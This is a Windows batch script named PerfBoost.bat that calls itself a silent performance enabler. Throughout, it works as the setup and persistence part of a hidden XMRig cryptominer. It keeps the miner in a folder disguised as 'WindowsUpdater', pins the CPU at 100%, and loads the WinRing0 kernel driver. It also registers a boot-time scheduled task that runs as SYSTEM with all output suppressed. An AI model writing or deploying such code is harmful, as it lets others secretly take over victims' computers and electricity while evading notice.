@echo off
setlocal enabledelayedexpansion

:: =====================================================
:: PerfBoost.bat - Performance Mode Enabler (Silent)
:: - Forces Ultimate Performance Plan
:: - Disables Core Parking & HPET
:: - Ensures CPU Min/Max states 100%
:: - Prepares MSR driver for XMRig
:: - Runs once per boot (via PerfBoostSvc task)
:: - Auto-uninstalls if miner folder is deleted
:: =====================================================

set "DEST=C:\ProgramData\WindowsUpdater"
set "TASK_NAME=PerfBoostSvc"
set "SRC=%~dp0"
set "MSR_SYS=%SRC%winring0x64.sys"

:: If miner folder is deleted, clean up this task and exit
if not exist "%DEST%" (
    schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
    exit /b
)

:: Apply Ultimate Performance power plan
powercfg /duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul 2>&1
powercfg /setactive e9a42b02-d5df-448d-aa00-03f14749eb61 >nul 2>&1

:: Ensure CPU stays at 100% (AC/DC)
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100 >nul 2>&1
powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100 >nul 2>&1
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMIN 100 >nul 2>&1
powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMIN 100 >nul 2>&1

:: Disable Core Parking
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CsEnabled" /t REG_DWORD /d 0 /f >nul 2>&1

:: Disable HPET (High Precision Event Timer)
bcdedit /deletevalue useplatformclock >nul 2>&1

:: MSR Mod (WinRing0 driver)
sc stop WinRing0_1_2_0 >nul 2>&1
sc delete WinRing0_1_2_0 >nul 2>&1
if exist "%MSR_SYS%" (
    sc create WinRing0_1_2_0 binPath= "\??\%MSR_SYS%" type= kernel start= demand >nul 2>&1
    sc start WinRing0_1_2_0 >nul 2>&1
)

:: Create Scheduled Task (silent, once per boot)
schtasks /create /tn "%TASK_NAME%" ^
  /tr "\"%~f0\"" ^
  /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1

exit /b
